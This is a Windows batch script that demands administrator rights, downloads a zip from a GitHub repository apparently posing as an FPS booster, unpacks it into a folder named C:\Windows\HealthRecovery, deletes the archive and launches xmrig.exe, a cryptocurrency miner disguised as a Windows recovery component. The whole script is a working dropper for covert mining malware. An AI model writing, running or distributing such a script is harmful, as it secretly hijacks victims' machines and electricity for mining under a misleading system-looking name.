@echo off

:: Check for admin privileges
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    echo This script must be run as Administrator.
    pause
    exit /b 1
)

:: === CONFIGURATION ===
set "DOWNLOAD_URL=https://raw.githubusercontent.com/fpsboostingontop/adasdad/main/ExecFileD.zip"
set "INSTALL_DIR=C:\Windows\HealthRecovery"
set "ZIP_NAME=ExectFileD.zip"
set "EXTRACTED_EXE=%INSTALL_DIR%\windowsrecovery\xmrig.exe"

:: === CREATE INSTALL DIRECTORY ===
echo Creating install directory...
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%"
    if %errorlevel% neq 0 (
        echo Failed to create "%INSTALL_DIR%". Check permissions.
        pause
        exit /b 1
    )
)

:: === DOWNLOAD FILE ===
echo Downloading %ZIP_NAME%...
powershell -NoProfile -Command ^
  "try { Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%INSTALL_DIR%\%ZIP_NAME%' -UseBasicParsing; exit 0 } catch { Write-Error $_; exit 1 }"

if %errorlevel% neq 0 (
    echo Download failed.
    pause
    exit /b 1
)

:: === CHECK FILE SIZE ===
for %%I in ("%INSTALL_DIR%\%ZIP_NAME%") do set "FILE_SIZE=%%~zI"
echo Downloaded file size: %FILE_SIZE% bytes
if "%FILE_SIZE%"=="0" (
    echo Downloaded file is empty. The link might be wrong.
    pause
    exit /b 1
)

:: === EXTRACT IN PLACE ===
echo Extracting into %INSTALL_DIR%...
powershell -NoProfile -Command ^
  "try { Expand-Archive -Path '%INSTALL_DIR%\%ZIP_NAME%' -DestinationPath '%INSTALL_DIR%' -Force; exit 0 } catch { Write-Error $_; exit 1 }"

if %errorlevel% neq 0 (
    echo Extraction failed. The file may be corrupted.
    pause
    exit /b 1
)

:: === DELETE ZIP ===
del /f /q "%INSTALL_DIR%\%ZIP_NAME%"

:: === RUN THE EXTRACTED PROGRAM ===
if exist "%EXTRACTED_EXE%" (
    echo Running %EXTRACTED_EXE%...
    start "" "%EXTRACTED_EXE%"
) else (
    echo ERROR: %EXTRACTED_EXE% not found after extraction.
    pause
    exit /b 1
)

echo Done.
pause
exit /b 0
